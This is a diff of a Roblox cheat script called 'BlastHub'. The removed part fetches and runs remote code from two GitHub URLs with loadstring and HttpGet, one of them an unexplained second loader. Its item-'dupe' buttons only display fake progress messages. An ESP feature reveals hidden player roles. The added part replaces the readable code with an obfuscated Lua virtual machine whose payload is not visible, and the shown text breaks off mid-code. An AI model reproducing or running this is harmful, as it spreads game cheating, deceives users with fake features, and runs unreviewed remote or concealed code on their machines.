@@ -1,302 +1,720 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "BlastHub | Summer Update🏄", HidePremium = false, IntroText = "BlastHub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
-OrionLib:MakeNotification({
-	Name = "Loading Script...",
-	Content = "Script will be loaded in 25-30 seconds | Note - Seconds Shown Here are not the exact loading time❗",
-	Image = "rbxassetid://18170549235",
-	Time = 30
-})
-
-
-
-getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NzxCrab-wq/OrionLibrary/main/NzxCrab"))()
-
 --[[
-Name = <string> - The name of the UI.
-HidePremium = <bool> - Whether or not the user details shows Premium status or not.
-SaveConfig = <bool> - Toggles the config saving in the UI.
-ConfigFolder = <string> - The name of the folder where the configs are saved.
-IntroEnabled = <bool> - Whether or not to show the intro animation.
-IntroText = <string> - Text to show in the intro animation.
-IntroIcon = <string> - URL to the image you want to use in the intro animation.
-Icon = <string> - URL to the image you want displayed on the window.
-CloseCallback = <function> - Function to execute when the window is closed.
-]]
-local Tab = Window:MakeTab({
-    Name = "Dupe Guns 🔫",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-OrionLib:MakeNotification({
-	Name = "Script Successfully Loaded",
-	Content = "Loading Has been successful ",
-	Image = "rbxassetid://17849312358",
-	Time = 30
-})
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.6) ~  Much Love, Ferib 
 
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
-Tab:AddParagraph("Read Before Using❗","First Step is click to select ur equipped gun make sure u got a gun equipped this will not work if the first step has been skipped, Second Step and the final step is click the dupe button and wait 2-4 minutes")
-Tab:AddButton({
-	Name = "Click to select Equipped-Gun 🔫",
-	Callback = function()
-      		OrionLib:MakeNotification({
-	Name = "Gun Selected ❗",
-	Content = "The Equipped-Gun Has Been Successfully Selected",
-	Image = "rbxassetid://4483345998",
-	Time = 5
-})
+]]--
 
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
-  	end    
-})
-
-Tab:AddButton({
-	Name = "Click To Dupe-Selected-Gun 🎯",
-	Callback = function()
-OrionLib:MakeNotification({
-	Name = "Duping Guns...⏳",
-	Content = "Duping is in process-[Takes around 1-2 minutes]-Dont leave the game❗",
-	Image = "rbxassetid://4483345998",
-	Time = 120
-})
-OrionLib:MakeNotification({
-	Name = "Read-[📕]",
-	Content = "Items not getting duped? Check if u are on a public server this will not work on a private server",
-	Image = "rbxassetid://4483345998",
-	Time = 25
-})
-Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 2-4 minutes❗But it is the only working dupe method🔨 ")
-
-
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
-  	end    
-})
-
-Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is NzxCrab")
-Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 2-4 minutes❗But it is the only working dupe method🔨 ")
-local Tab = Window:MakeTab({
-    Name = "Dupe Knives 🔪",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
-Tab:AddParagraph("Read Before Using❗","First Step is click to select ur equipped Knife make sure u got a Knife equipped this will not work if the first step has been skipped, Second Step and the final step is click the dupe button and wait 1-2 minutes")
-Tab:AddButton({
-	Name = "Click to select Equipped-Knife 🔪",
-	Callback = function()
-      		OrionLib:MakeNotification({
-	Name = "Selected Equipped Knife❗",
-	Content = "The Equipped-Knife Successfully Selected",
-	Image = "rbxassetid://4483345998",
-	Time = 5
-})
-
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
-  	end    
-})
-
-Tab:AddButton({
-	Name = "Click To Dupe-Your-Knife 🎯",
-	Callback = function()
-	OrionLib:MakeNotification({
-	Name = "Duping Knives..⏳",
-	Content = "Duping is in process-[Takes Around 2-4 minutes] Dont Leave The Game❗",
-	Image = "rbxassetid://4483345998",
-	Time = 120
-})
-    OrionLib:MakeNotification({
-	Name = "Read-[📕]",
-	Content = "This script don't work on a private server",
-	Image = "rbxassetid://4483345998",
-	Time = 25
-})
-
-
-
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
-  	end    
-})
-Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, NzxCrab 🎩")
-Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 2-4 minutes❗But it is the only working dupe method🔨 ")
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-local Tab = Window:MakeTab({
-	Name = "Player-Esp🕶️",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-Tab:AddParagraph("Hidden Scripts / Esp❗","Will highlight whoever the murderer is RED and will highlight whoever the sheriff is BLUE and will highlight whoever is innocent GREEN")
-Tab:AddButton({
-	Name = "Click to enable-ESP 🎯",
-	Callback = function()
---[[
-    Credits to Kiriot22 for the Role getter <3
-        - poorly coded by FeIix <3
-]]
-
--- > Declarations < --
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LP = Players.LocalPlayer
-local roles
-
--- > Functions <--
-
-function CreateHighlight() -- make any new highlights for new players
-    for i, v in pairs(Players:GetChildren()) do
-        if v ~= LP and v.Character and not v.Character:FindFirstChild("Highlight") then
-            Instance.new("Highlight", v.Character)           
-        end
-    end
-end
-
-function UpdateHighlights() -- Get Current Role Colors (messy)
-    for _, v in pairs(Players:GetChildren()) do
-        if v ~= LP and v.Character and v.Character:FindFirstChild("Highlight") then
-            Highlight = v.Character:FindFirstChild("Highlight")
-            if v.Name == Sheriff and IsAlive(v) then
-                Highlight.FillColor = Color3.fromRGB(0, 0, 225)
-            elseif v.Name == Murder and IsAlive(v) then
-                Highlight.FillColor = Color3.fromRGB(225, 0, 0)
-            elseif v.Name == Hero and IsAlive(v) and not IsAlive(game.Players[Sheriff]) then
-                Highlight.FillColor = Color3.fromRGB(255, 250, 0)
-            else
-                Highlight.FillColor = Color3.fromRGB(0, 225, 0)
-            end
-        end
-    end
-end    
-
-function IsAlive(Player) -- Simple sexy function
-    for i, v in pairs(roles) do
-        if Player.Name == i then
-            if not v.Killed and not v.Dead then
-                return true
-            else
-                return false
-            end
-        end
-    end
-end
-
-
--- > Loops < --
-
-RunService.RenderStepped:connect(function()
-    roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
-    for i, v in pairs(roles) do
-        if v.Role == "Murderer" then
-            Murder = i
-        elseif v.Role == 'Sheriff'then
-            Sheriff = i
-        elseif v.Role == 'Hero'then
-            Hero = i
-        end
-    end
-    CreateHighlight()
-    UpdateHighlights()
-end)
-OrionLib:MakeNotification({
-	Name = "Player-Esp Enabled-🕶️",
-	Content = "The Player-Esp Feature has been enabled-🟢",
-	Image = "rbxassetid://4483345998",
-	Time = 7
-})
-
-
---[[
-Title = <string> - The title of the notification.
-Content = <string> - The content of the notification.
-Image = <string> - The icon of the notification.
-Time = <number> - The duration of the notfication.
-]]
-      		print("button pressed")
-  	end    
-})
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-local Tab = Window:MakeTab({
-    Name = "Errors/Bugs?❗",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-Tab:AddParagraph("My Discord server 🎩"," Join my discord server if u need help with bugs/errors on the script i made u can also talk to improve the script more")
-Tab:AddButton({
-	Name = "Copy Link To Discord Server 🎯",
-	Callback = function()
-    setclipboard("https://discord.com/invite/JruzxvMSzZ")
-      		print("button pressed")
-  	end    
-})
-Tab:AddParagraph("Read-[📕]","Please dont click the dupe buttons twice or multiple times this WILL cause errors❗")
-Tab:AddParagraph("Credits-⭐","Made By NzxCrab")
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
+local StrToNumber = tonumber;
+local Byte = string.byte;
+local Char = string.char;
+local Sub = string.sub;
+local Subg = string.gsub;
+local Rep = string.rep;
+local Concat = table.concat;
+local Insert = table.insert;
+local LDExp = math.ldexp;
+local GetFEnv = getfenv or function()
+	return _ENV;
+end;
+local Setmetatable = setmetatable;
+local PCall = pcall;
+local Select = select;
+local Unpack = unpack or table.unpack;
+local ToNumber = tonumber;
+local function VMCall(ByteString, vmenv, ...)
+	local DIP = 1;
+	local repeatNext;
+	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
+		if (Byte(byte, 2) == 79) then
+			repeatNext = StrToNumber(Sub(byte, 1, 1));
+			return "";
+		else
+			local a = Char(StrToNumber(byte, 16));
+			if repeatNext then
+				local b = Rep(a, repeatNext);
+				repeatNext = nil;
+				return b;
+			else
+				return a;
+			end
+		end
+	end);
+	local function gBit(Bit, Start, End)
+		if End then
+			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
+			return Res - (Res % 1);
+		else
+			local FlatIdent_95CAC = 0;
+			local Plc;
+			while true do
+				if (FlatIdent_95CAC == 0) then
+					Plc = 2 ^ (Start - 1);
+					return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
+				end
+			end
+		end
+	end
+	local function gBits8()
+		local a = Byte(ByteString, DIP, DIP);
+		DIP = DIP + 1;
+		return a;
+	end
+	local function gBits16()
+		local a, b = Byte(ByteString, DIP, DIP + 2);
+		DIP = DIP + 2;
+		return (b * 256) + a;
+	end
+	local function gBits32()
+		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
+		DIP = DIP + 4;
+		return (d * 16777216) + (c * 65536) + (b * 256) + a;
+	end
+	local function gFloat()
+		local FlatIdent_76979 = 0;
+		local Left;
+		local Right;
+		local IsNormal;
+		local Mantissa;
+		local Exponent;
+		local Sign;
+		while true do
+			if (FlatIdent_76979 == 0) then
+				Left = gBits32();
+				Right = gBits32();
+				FlatIdent_76979 = 1;
+			end
+			if (FlatIdent_76979 == 3) then
+				if (Exponent == 0) then
+					if (Mantissa == 0) then
+						return Sign * 0;
+					else
+						local FlatIdent_2FBEB = 0;
+						while true do
+							if (FlatIdent_2FBEB == 0) then
+								Exponent = 1;
+								IsNormal = 0;
+								break;
+							end
+						end
+					end
+				elseif (Exponent == 2047) then
+					return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
+				end
+				return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
+			end
+			if (FlatIdent_76979 == 2) then
+				Exponent = gBit(Right, 21, 31);
+				Sign = ((gBit(Right, 32) == 1) and -1) or 1;
+				FlatIdent_76979 = 3;
+			end
+			if (FlatIdent_76979 == 1) then
+				IsNormal = 1;
+				Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
+				FlatIdent_76979 = 2;
+			end
+		end
+	end
+	local function gString(Len)
+		local FlatIdent_8D83D = 0;
+		local Str;
+		local FStr;
+		while true do
+			if (FlatIdent_8D83D == 1) then
+				Str = Sub(ByteString, DIP, (DIP + Len) - 1);
+				DIP = DIP + Len;
+				FlatIdent_8D83D = 2;
+			end
+			if (FlatIdent_8D83D == 0) then
+				Str = nil;
+				if not Len then
+					Len = gBits32();
+					if (Len == 0) then
+						return "";
+					end
+				end
+				FlatIdent_8D83D = 1;
+			end
+			if (FlatIdent_8D83D == 3) then
+				return Concat(FStr);
+			end
+			if (FlatIdent_8D83D == 2) then
+				FStr = {};
+				for Idx = 1, #Str do
+					FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
+				end
+				FlatIdent_8D83D = 3;
+			end
+		end
+	end
+	local gInt = gBits32;
+	local function _R(...)
+		return {...}, Select("#", ...);
+	end
+	local function Deserialize()
+		local Instrs = {};
+		local Functions = {};
+		local Lines = {};
+		local Chunk = {Instrs,Functions,nil,Lines};
+		local ConstCount = gBits32();
+		local Consts = {};
+		for Idx = 1, ConstCount do
+			local Type = gBits8();
+			local Cons;
+			if (Type == 1) then
+				Cons = gBits8() ~= 0;
+			elseif (Type == 2) then
+				Cons = gFloat();
+			elseif (Type == 3) then
+				Cons = gString();
+			end
+			Consts[Idx] = Cons;
+		end
+		Chunk[3] = gBits8();
+		for Idx = 1, gBits32() do
+			local FlatIdent_31A5A = 0;
+			local Descriptor;
+			while true do
+				if (FlatIdent_31A5A == 0) then
+					Descriptor = gBits8();
+					if (gBit(Descriptor, 1, 1) == 0) then
+						local FlatIdent_5ED46 = 0;
+						local Type;
+						local Mask;
+						local Inst;
+						while true do
+							if (2 == FlatIdent_5ED46) then
+								if (gBit(Mask, 1, 1) == 1) then
+									Inst[2] = Consts[Inst[2]];
+								end
+								if (gBit(Mask, 2, 2) == 1) then
+									Inst[3] = Consts[Inst[3]];
+								end
+								FlatIdent_5ED46 = 3;
+							end
+							if (3 == FlatIdent_5ED46) then
+								if (gBit(Mask, 3, 3) == 1) then
+									Inst[4] = Consts[Inst[4]];
+								end
+								Instrs[Idx] = Inst;
+								break;
+							end
+							if (FlatIdent_5ED46 == 1) then
+								Inst = {gBits16(),gBits16(),nil,nil};
+								if (Type == 0) then
+									Inst[3] = gBits16();
+									Inst[4] = gBits16();
+								elseif (Type == 1) then
+									Inst[3] = gBits32();
+								elseif (Type == 2) then
+									Inst[3] = gBits32() - (2 ^ 16);
+								elseif (Type == 3) then
+									Inst[3] = gBits32() - (2 ^ 16);
+									Inst[4] = gBits16();
+								end
+								FlatIdent_5ED46 = 2;
+							end
+							if (FlatIdent_5ED46 == 0) then
+								Type = gBit(Descriptor, 2, 3);
+								Mask = gBit(Descriptor, 4, 6);
+								FlatIdent_5ED46 = 1;
+							end
+						end
+					end
+					break;
+				end
+			end
+		end
+		for Idx = 1, gBits32() do
+			Functions[Idx - 1] = Deserialize();
+		end
+		return Chunk;
+	end
+	local function Wrap(Chunk, Upvalues, Env)
+		local Instr = Chunk[1];
+		local Proto = Chunk[2];
+		local Params = Chunk[3];
+		return function(...)
+			local Instr = Instr;
+			local Proto = Proto;
+			local Params = Params;
+			local _R = _R;
+			local VIP = 1;
+			local Top = -1;
+			local Vararg = {};
+			local Args = {...};
+			local PCount = Select("#", ...) - 1;
+			local Lupvals = {};
+			local Stk = {};
+			for Idx = 0, PCount do
+				if (Idx >= Params) then
+					Vararg[Idx - Params] = Args[Idx + 1];
+				else
+					Stk[Idx] = Args[Idx + 1];
+				end
+			end
+			local Varargsz = (PCount - Params) + 1;
+			local Inst;
+			local Enum;
+			while true do
+				local FlatIdent_6053C = 0;
+				while true do
+					if (FlatIdent_6053C == 0) then
+						Inst = Instr[VIP];
+						Enum = Inst[1];
+						FlatIdent_6053C = 1;
+					end
+					if (FlatIdent_6053C == 1) then
+						if (Enum <= 33) then
+							if (Enum <= 16) then
+								if (Enum <= 7) then
+									if (Enum <= 3) then
+										if (Enum <= 1) then
+											if (Enum == 0) then
+												local FlatIdent_99389 = 0;
+												local A;
+												while true do
+													if (FlatIdent_99389 == 0) then
+														A = Inst[2];
+														do
+															return Unpack(Stk, A, A + Inst[3]);
+														end
+														break;
+													end
+												end
+											else
+												local FlatIdent_8CEDF = 0;
+												local A;
+												while true do
+													if (FlatIdent_8CEDF == 0) then
+														A = Inst[2];
+														Stk[A] = Stk[A](Stk[A + 1]);
+														break;
+													end
+												end
+											end
+										elseif (Enum > 2) then
+											local FlatIdent_33EA4 = 0;
+											local B;
+											local A;
+											while true do
+												if (FlatIdent_33EA4 == 1) then
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													A = Inst[2];
+													FlatIdent_33EA4 = 2;
+												end
+												if (FlatIdent_33EA4 == 6) then
+													Stk[Inst[2]][Inst[3]] = Inst[4];
+													break;
+												end
+												if (FlatIdent_33EA4 == 0) then
+													B = nil;
+													A = nil;
+													Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
+													FlatIdent_33EA4 = 1;
+												end
+												if (FlatIdent_33EA4 == 3) then
+													A = Inst[2];
+													B = Stk[Inst[3]];
+													Stk[A + 1] = B;
+													FlatIdent_33EA4 = 4;
+												end
+												if (FlatIdent_33EA4 == 4) then
+													Stk[A] = B[Inst[4]];
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													FlatIdent_33EA4 = 5;
+												end
+												if (FlatIdent_33EA4 == 2) then
+													Stk[A](Unpack(Stk, A + 1, Inst[3]));
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													FlatIdent_33EA4 = 3;
+												end
+												if (FlatIdent_33EA4 == 5) then
+													Stk[Inst[2]] = {};
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													FlatIdent_33EA4 = 6;
+												end
+											end
+										else
+											local B;
+											local A;
+											Stk[Inst[2]] = Upvalues[Inst[3]];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											A = Inst[2];
+											B = Stk[Inst[3]];
+											Stk[A + 1] = B;
+											Stk[A] = B[Inst[4]];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]] = {};
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]][Inst[3]] = Inst[4];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]][Inst[3]] = Inst[4];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]][Inst[3]] = Inst[4];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]][Inst[3]] = Inst[4];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											A = Inst[2];
+											Stk[A](Unpack(Stk, A + 1, Inst[3]));
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											do
+												return;
+											end
+										end
+									elseif (Enum <= 5) then
+										if (Enum == 4) then
+											local FlatIdent_6B983 = 0;
+											local Results;
+											local Edx;
+											local Limit;
+											local B;
+											local A;
+											while true do
+												if (FlatIdent_6B983 == 1) then
+													Stk[Inst[2]] = Env[Inst[3]];
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													Stk[Inst[2]] = Upvalues[Inst[3]];
+													VIP = VIP + 1;
+													FlatIdent_6B983 = 2;
+												end
+												if (FlatIdent_6B983 == 5) then
+													Results = {Stk[A](Unpack(Stk, A + 1, Top))};
+													Edx = 0;
+													for Idx = A, Inst[4] do
+														Edx = Edx + 1;
+														Stk[Idx] = Results[Edx];
+													end
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													FlatIdent_6B983 = 6;
+												end
+												if (FlatIdent_6B983 == 0) then
+													Results = nil;
+													Edx = nil;
+													Results, Limit = nil;
+													B = nil;
+													A = nil;
+													FlatIdent_6B983 = 1;
+												end
+												if (FlatIdent_6B983 == 4) then
+													Edx = 0;
+													for Idx = A, Top do
+														Edx = Edx + 1;
+														Stk[Idx] = Results[Edx];
+													end
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													A = Inst[2];
+													FlatIdent_6B983 = 5;
+												end
+												if (FlatIdent_6B983 == 2) then
+													Inst = Instr[VIP];
+													A = Inst[2];
+													B = Stk[Inst[3]];
+													Stk[A + 1] = B;
+													Stk[A] = B[Inst[4]];
+													FlatIdent_6B983 = 3;
+												end
+												if (FlatIdent_6B983 == 3) then
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													A = Inst[2];
+													Results, Limit = _R(Stk[A](Stk[A + 1]));
+													Top = (Limit + A) - 1;
+													FlatIdent_6B983 = 4;
+												end
+												if (FlatIdent_6B983 == 6) then
+													VIP = Inst[3];
+													break;
+												end
+											end
+										else
+											local B;
+											local A;
+											Stk[Inst[2]] = {};
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]][Inst[3]] = Inst[4];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]][Inst[3]] = Inst[4];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]][Inst[3]] = Inst[4];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											A = Inst[2];
+											Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											A = Inst[2];
+											B = Stk[Inst[3]];
+											Stk[A + 1] = B;
+											Stk[A] = B[Inst[4]];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]] = Inst[3];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											Stk[Inst[2]] = Inst[3];
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											A = Inst[2];
+											Stk[A](Unpack(Stk, A + 1, Inst[3]));
+											VIP = VIP + 1;
+											Inst = Instr[VIP];
+											A = Inst[2];
+											B = Stk[Inst[3]];
+											Stk[A + 1] = B;
+											Stk[A] = B[Inst[4]];
+										end
+									elseif (Enum > 6) then
+										local B;
+										local A;
+										Stk[Inst[2]] = Env[Inst[3]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										B = Stk[Inst[3]];
+										Stk[A + 1] = B;
+										Stk[A] = B[Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Inst[3];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Env[Inst[3]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										B = Stk[Inst[3]];
+										Stk[A + 1] = B;
+										Stk[A] = B[Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Inst[3];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Env[Inst[3]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										B = Stk[Inst[3]];
+										Stk[A + 1] = B;
+										Stk[A] = B[Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Inst[3];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										for Idx = Inst[2], Inst[3] do
+											Stk[Idx] = nil;
+										end
+									else
+										local B;
+										local A;
+										Stk[Inst[2]] = Upvalues[Inst[3]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										B = Stk[Inst[3]];
+										Stk[A + 1] = B;
+										Stk[A] = B[Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = {};
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]][Inst[3]] = Inst[4];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]][Inst[3]] = Inst[4];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]][Inst[3]] = Inst[4];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]][Inst[3]] = Inst[4];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										Stk[A](Unpack(Stk, A + 1, Inst[3]));
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										do
+											return;
+										end
+									end
+								elseif (Enum <= 11) then
+									if (Enum <= 9) then
+										if (Enum > 8) then
+											do
+												return Stk[Inst[2]];
+											end
+										else
+											local FlatIdent_61EE = 0;
+											local B;
+											local A;
+											while true do
+												if (FlatIdent_61EE == 4) then
+													Inst = Instr[VIP];
+													Stk[Inst[2]][Inst[3]] = Inst[4];
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													Stk[Inst[2]][Inst[3]] = Inst[4];
+													FlatIdent_61EE = 5;
+												end
+												if (FlatIdent_61EE == 7) then
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													Stk[Inst[2]] = Inst[3];
+													break;
+												end
+												if (FlatIdent_61EE == 6) then
+													Inst = Instr[VIP];
+													A = Inst[2];
+													B = Stk[Inst[3]];
+													Stk[A + 1] = B;
+													Stk[A] = B[Inst[4]];
+													FlatIdent_61EE = 7;
+												end
+												if (3 == FlatIdent_61EE) then
+													Stk[Inst[2]] = {};
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													Stk[Inst[2]][Inst[3]] = Inst[4];
+													VIP = VIP + 1;
+													FlatIdent_61EE = 4;
+												end
+												if (FlatIdent_61EE == 5) then
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													A = Inst[2];
+													Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+													VIP = VIP + 1;
+													FlatIdent_61EE = 6;
+												end
+												if (FlatIdent_61EE == 2) then
+													B = Stk[Inst[3]];
+													Stk[A + 1] = B;
+													Stk[A] = B[Inst[4]];
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													FlatIdent_61EE = 3;
+												end
+												if (FlatIdent_61EE == 1) then
+													A = Inst[2];
+													Stk[A](Unpack(Stk, A + 1, Inst[3]));
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													A = Inst[2];
+													FlatIdent_61EE = 2;
+												end
+												if (FlatIdent_61EE == 0) then
+													B = nil;
+													A = nil;
+													Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
+													VIP = VIP + 1;
+													Inst = Instr[VIP];
+													FlatIdent_61EE = 1;
+												end
+											end
+										end
+									elseif (Enum > 10) then
+										local B;
+										local A;
+										A = Inst[2];
+										B = Stk[Inst[3]];
+										Stk[A + 1] = B;
+										Stk[A] = B[Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Inst[3];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Env[Inst[3]] = Stk[Inst[2]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Env[Inst[3]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										if (Stk[Inst[2]] == Stk[Inst[4]]) then
+											VIP = VIP + 1;
+										else
+											VIP = Inst[3];
+										end
+									else
+										local Edx;
+										local Results;
+										local B;
+										local A;
+										A = Inst[2];
+										B = Stk[Inst[3]];
+										Stk[A + 1] = B;
+										Stk[A] = B[Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Inst[3];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Stk[Inst[2]] = Inst[3] ~= 0;
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										B = Stk[Inst[3]];
+										Stk[A + 1] = B;
+										Stk[A] = B[Inst[4]];
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										A = Inst[2];
+										Stk[A] = Stk[A](Stk[A + 1]);
+										VIP = VIP + 1;
+										Inst = Instr[VIP];
+										Upvalues[Inst[3]] = Stk[Inst[2]];
+										VIP = VIP + 1;
